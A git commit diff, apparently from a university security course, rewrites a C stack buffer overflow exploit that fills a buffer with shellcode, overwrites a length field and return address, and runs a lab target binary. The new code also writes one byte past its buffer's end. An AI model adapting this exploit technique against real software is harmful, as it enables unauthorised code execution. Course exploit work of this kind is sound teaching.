c54c919859809c32b4fb71c4394cb7531b86ceef
Charlie Huang <haoen.huang@mail.utoronto.ca>
2018-01-25 23:21:38 -0500

    Update sploit2.c

--- sploits/sploit2.c
+++ sploits/sploit2.c
@@ -5,55 +5,47 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target2"
+#define BUFFER_SIZE 284
 
-#define DEBUG 0
+int main (int argc, char* argv[]) {
+        char*   args[3];
+        char*   env[2];
+        int i;
+        args[0] = TARGET;
 
-int
-main ( int argc, char * argv[] )
-{
-	char *	args[3];
-	char *	env[2];
-	
-	args[0] = TARGET;
-	// Write a value greater than 272 (to overwrite len)
-	char exploit[283];
-	strcpy(exploit, shellcode);
-	int i = 0;
-	for (i = 45; i < 270; i++) {
-		exploit[i] = 0x01;
-	}
-	for (i = 270; i < 272; i++) {
-		exploit[i] = 0x00;
-	}
-	for (i = 272; i < 285; i++) {
-		exploit[i] = 0x01;
-	}
-	char overwrite_val = 0x0B; // 267
-	char* overwrite_i = (char*) (exploit + 264);
-        *overwrite_i = overwrite_val;
-	overwrite_val = 0x1B; // 283
-	char* overwrite_len = (char*) (exploit + 268);
-	*overwrite_len = overwrite_val;
-	int return_add = 0x2021fd40;
-	int* overwrite_ret = (int*) (exploit + 280);
-	*overwrite_ret = return_add;
-	exploit[284] = '\0';
-        if (DEBUG) {
-                printf("Length: %d\n", strlen(exploit));
-                // Print out buffer to debug
-                for (i = 0; i < 285; i++) {
-                        printf("%x ", 0xff & exploit[i]);
-                }
-                fflush(stdout);
+        // Write a value greater than 272 into len
+        char exploit[BUFFER_SIZE];
+        strcpy(exploit, shellcode);
+
+        // Enter non-null-terminators
+        for (i = 45; i < BUFFER_SIZE; i++) {
+                exploit[i] = 0x01;
         }
-	args[1] = exploit;
-	args[2] = NULL;
 
-	env[0] = &exploit[271];
-	env[1] = &exploit[272];
+        char overwrite_val = 0x0B; // 267 no-op
+        char* overwrite_i = (char*) (exploit + 264);
+        *overwrite_i = overwrite_val;
 
-	if ( execve (TARGET, args, env) < 0 )
-		fprintf (stderr, "execve failed.\n");
+        overwrite_val = 0x1B; // 283
+        char* overwrite_len = (char*) (exploit + 268);
+        *overwrite_len = overwrite_val;
+        exploit[270] = 0x00;
+        exploit[271] = 0x00;
 
-	return (0);
+        int return_add = 0x2021fd40;
+        int* overwrite_ret = (int*) (exploit + 280);
+        *overwrite_ret = return_add;
+
+        exploit[BUFFER_SIZE] = '\0';
+
+        args[1] = exploit;
+        args[2] = NULL;
+
+        env[0] = &exploit[271];
+        env[1] = &exploit[272];
+
+        if ( execve (TARGET, args, env) < 0 )
+                fprintf (stderr, "execve failed.\n");
+
+        return 1;
 }
